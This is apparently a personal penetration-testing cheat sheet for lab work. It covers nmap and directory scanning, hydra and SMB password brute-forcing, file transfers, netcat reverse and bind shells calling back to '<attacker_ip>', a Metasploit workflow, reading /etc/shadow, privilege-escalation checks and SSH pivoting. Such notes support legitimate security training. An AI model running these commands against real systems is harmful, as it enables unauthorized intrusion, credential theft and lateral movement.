

# 💻 Essential Commands and File Transfers

---

## 🔍 Network and Host Discovery

- `ifconfig` — Show your **Kali VM IP** (e.g., 10.0.2.15).
- `sudo nano /etc/hosts` — Add or change local **hostname-to-IP mappings** that override DNS.
- `netdiscover -r 10.0.2.0/24` — Sweep the subnet to **discover live hosts** (ARP scan for local networks).
- `nmap -T4 -p- -A 10.0.2.4` — Aggressive **full-TCP-port scan** (1–65535) with OS/version/script detection and traceroute.
- `nmap -sV --script=vuln 10.0.2.4` — Service version + vulnerability script scan (targeted follow-up).

> **Note:** Always use the `-oN` parameter to save nmap output to a text file:
> `nmap -T4 -p- -A 10.0.2.4 -oN test.txt`

- `nikto -h http://10.0.2.4` — Quick **webserver/vuln & misconfiguration check** (HTTP/HTTPS).
- `smbclient -L //10.0.2.4` — List **SMB shares** (anonymous if no `-U` user supplied).
- `smbclient //10.0.2.4/Share -U username` — Connect interactively to an SMB share.
- `ssh username@10.0.2.4` — Attempt **SSH login**.
- `hydra -l root -P /usr/share/wordlists/metasploit/… ssh://*ip address* -t 4 -V` — **Hydra** brute-forces the SSH password of a target system.
- `gobuster dir -u http://10.0.2.4 -w /usr/share/wordlists/dirb/common.txt -x php,txt,zip` — **Brute-force directories/files** on webserver (CLI alternative to DirBuster).
- `crackmapexec smb 10.0.2.0/24 -u users.txt -p passwords.txt --shares` — **SMB credential brute-forcing**.
- `dirb http://10.0.2.4 /usr/share/wordlists/dirb/common.txt -X .php,.txt` — Another directory buster usage (find hidden files/dirs).
- `ffuf -u http://10.0.2.4/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 40 -mc 200 -o ffuf_dirs.json -of json` — Finds directories/files under the web root.
- `wpscan --url http://target --enumerate` — **WordPress Enumeration**.

---

## 📥 File Transfers

| Method | Command / Usage | Description |
| :--- | :--- | :--- |
| **HTTP (Python 2)** | `python -m SimpleHTTPServer 80` | Starts a quick HTTP server in the current directory. |
| **HTTP (Python 3)** | `python3 -m http.server 80` | Starts a quick HTTP server in the current directory. |
| **Browser** | `http://10.10.10.10/file.txt` | Open the URL directly in a browser to download the file. |
| **FTP (pyftpdlib)** | `python -m pyftpdlib 21` (Attacker) $\rightarrow$ `ftp 10.10.10.10` (Client) | Run a lightweight FTP server on the host and connect from the target to transfer files. |
| **Certutil (Windows)** | `certutil.exe -urlcache -f http://10.10.10.10/file.txt file.txt` | Uses the built-in Windows `certutil` to download a remote file and save it locally. |
| **Linux (wget)** | `wget http://10.10.10.10/file.txt` | Command-line download of a file from an HTTP server. |

## 💻 Addons

- Download the **FoxyProxy** extension, then add a proxy specifically for **Burp Suite** so you can use it very quickly and efficiently.
- Download the **Wappalyzer** and/or **BuiltWith** extension to identify the technologies running on a website.
- Download the **EditThisCookie** extension to view, edit, export/import cookies.

---
## 🐚 Reverse and Bind Shells

This section details the basic setup for Netcat listeners and shell commands.

### Reverse Shell (Victim connects to Attacker)

| Role | Command | Description |
| :--- | :--- | :--- |
| **Attacker (Listener)** | `nc -lvp 4444` | Set up a listener on port 4444. |
| **Victim (Reverse)** | `nc <attacker_ip> 4444 -e /bin/sh` | Send a shell back to the attacker's IP and port. |

### Bind Shell (Attacker connects to Victim)

| Role | Command | Description |
| :--- | :--- | :--- |
| **Victim (Listener)** | `nc -nlvp 4444 -e /bin/sh` | Set up a listener on the victim machine that binds a shell to port 4444. |
| **Attacker (Connects)** | `nc <victim_ip> 4444` | Connect to the victim's listening port to receive the shell. |
---
## ⚔️ Metasploit Workflow

This sequence of commands outlines the typical steps for using the `msfconsole` to select, configure, and execute an exploit.

### Steps
1.  `msfconsole` — Start the Metasploit framework console.
2.  `search <service_or_cve>` — Find relevant modules based on a service (e.g., `smb`) or CVE number.
3.  `use exploit/<module>` — Load the desired exploit module.
4.  `show options` — Display the required parameters (like RHOSTS, LHOST, PAYLOAD) that need to be set.
5.  `set RHOSTS <target>` — Specify the target **remote host** IP address(es).
6.  `set PAYLOAD <payload>` — Select the payload to deliver to the target (e.g., `windows/meterpreter/reverse_tcp`).
7.  `set LHOST <attacker_ip>` — Specify the **local host** (attacker's) IP address for the reverse connection.
8.  `exploit` — Execute the exploit against the target.
---

## 🕵️ Post-exploitation Enumeration Commands

This list includes basic commands for gathering system and user information after gaining initial access.

```bash
# User and System Identification
whoami; id
uname -a; cat /etc/os-release

# Network Information
ip a / ifconfig
netstat -tulpn / ss -tulpn

# Process and File System Checks
ps aux | less
ls -la /home

# Search for sensitive files (suppressing errors)
find / -type f -name "*pass*" 2>/dev/null

# Privilege Escalation Checks
sudo -l

# User and Credential File Access
cat /etc/passwd; cat /etc/shadow  # shadow file requires root privileges to read

```
## 📈 Privilege Escalation Auditing Checks

This list provides quick manual commands for initial privilege escalation reconnaissance on both Linux and Windows systems.

### 🐧 Linux Quick Checks (Manual)

* **Check `sudo` permissions:**
    ```bash
    sudo -l
    ```
* **Check running SSH processes (potential keys/config):**
    ```bash
    ps aux | grep -i ssh
    ```
* **List listening network ports and processes (services running as root):**
    ```bash
    lsof -nP | grep LISTEN
    ```
* **Review authentication logs (users logging in):**
    ```bash
    cat /var/log/auth.log
    ```
* **Find files with SUID/SGID permissions (potential exploitation vectors):**
    ```bash
    find / -perm -u=s -type f 2 >/dev/null
    ```
> **Note:** For automated auditing, tools like **LinPEAS** are highly recommended.

### 🪟 Windows Quick Checks (Manual)

* **Check user privileges (SeDebugPrivilege, etc.):**
    ```powershell
    whoami /priv
    ```
* **Enumerate members of the local Administrators group:**
    ```powershell
    powershell Get-LocalGroupMember -Group Administrators
    ```
> **Note:** For automated auditing, tools like **WinPEAS** are highly recommended.

---
## 🕸️ Pivoting: Accessing Restricted Networks

**Pivoting** is the method of allowing ourselves to get access to other networks from sitting on one network.

***

### 🛠️ Pivoting Tools and Techniques

| Tool/Technique | Description | Key Use Case |
| :--- | :--- | :--- |
| **`proxychains`** | Forces a single command’s TCP traffic through one or more proxies (SOCKS4/5 or HTTP) defined in `/etc/proxychains4.conf`. | Good for **per-command proxying** (e.g., `proxychains nmap ...`). |
| **`ssh -D`** | Creates a **local SOCKS listener** that forwards traffic through the SSH tunnel (used as the proxy target for proxychains). | Creating a basic **dynamic SOCKS proxy** via an SSH tunnel. |
| **`sshuttle`** | A lightweight, VPN-like tool that routes a **whole subnet** through an SSH host; you don’t need to prefix every command. | Provides **transparent access** to a remote subnet. |

***

### ⚙️ `proxychains` Configuration & Setup

#### 1. Configuration File
- **View Config:**
    ```bash
    cat /etc/proxychains4.conf
    ```
    > The last proxy line is typically the one you bind to (e.g., `socks5 127.0.0.1 9050`).

#### 2. Create SSH Dynamic Forward (Attacker Box)
This opens the SOCKS proxy locally:
```bash
ssh -f -N -D 9050 -i pivot root@10.10.155.5
```
>This opens a local SOCKS proxy on localhost:9050 that tunnels via 10.10.155.5.

### 3. `proxychains` Usage Examples

These commands demonstrate forcing specific tools through the configured SOCKS proxy.

| Task | Command | Note |
| :--- | :--- | :--- |
| **Proxy a single command** | `proxychains nmap -p 88 10.10.10.225` | Forces the `nmap` scan through the proxy. |
| **Nmap TCP Connect Mode** | `proxychains nmap 10.10.10.225 -sT` | Use **`-sT`** (TCP Connect Scan) as raw SYN scans often fail when proxied. |
| **Kerberos Enumeration** | `proxychains GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip 10.10.10.255 -request` | Routes a Python script's traffic through the proxy. |
| **RDP over proxychains** | `proxychains xfreerdp /u:administrator /p:'Hacker321!' /v:10.10.10.225` | Connects the RDP client through the SOCKS tunnel. |

***

## 🚀 `sshuttle` Usage Examples

`sshuttle` creates a transparent proxy, making it behave like a full VPN connection for a specified subnet.

1.  **Installation:**
    ```bash
    sudo apt install sshuttle
    ```
2.  **Route an Entire Subnet through the Pivot Host (using a private key):**
    ```bash
    sshuttle -r root@10.10.155.5 10.10.10.0/24 --ssh-cmd "ssh -i pivot"
    ```
    > Once running, any normal commands that target `10.10.10.*` will route automatically through the pivot host.

***

## 🤔 When to Use Which Tool

| Tool | Recommended Use Case |
| :--- | :--- |
| **`proxychains`** | When you want to proxy **specific commands or tools** and test many different proxies/configs. Good for quickly forcing one tool through SOCKS. |
| **`sshuttle`** | When you want **transparent access** to a whole remote subnet (no need to prefix commands). Better for extended enumeration and tooling that expects direct network access. |

---
## 👤 Username Generation & 📁 Wordlist Locations

This section details key resources for generating usernames and locating common wordlists used in penetration testing.

### 🤖 Username Generation Tool

| Tool | Description | URL |
| :--- | :--- | :--- |
| **Username-Anarchy** | A tool to generate potential usernames based on names and common corporate naming conventions. | [https://github.com/urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy) |

---

### 📚 Common Wordlist Locations

| Purpose | Recommended List/Source | Location / Path Examples |
| :--- | :--- | :--- |
| **Passwords** | **rockyou.txt** | - **Kali Local:** `/usr/share/wordlists/rockyou.txt.gz` (must extract) |
| **Usernames** | **SecLists (Names lists)** | - **Kali Local Examples:** `/usr/share/seclists/Usernames/Names/names.txt` |
| **Web Discovery (DirBuster/Dirb)** | **SecLists Web-Content** (e.g., `common.txt`, `directory-list-*`, `raft-*`) | - **Kali Package Paths:** `/usr/share/dirbuster/` or `/usr/share/wordlists/` |
| **Subdomains** | **SecLists DNS / subdomain lists** | - Check SecLists: `Discovery/DNS / DNS-subdomains` folders. |
| **FFUF (Directory Fuzzing)** | **raft-small-directories.txt** | - Found in `SecLists/Discovery/Web-Content/raft-small-directories.txt`. |
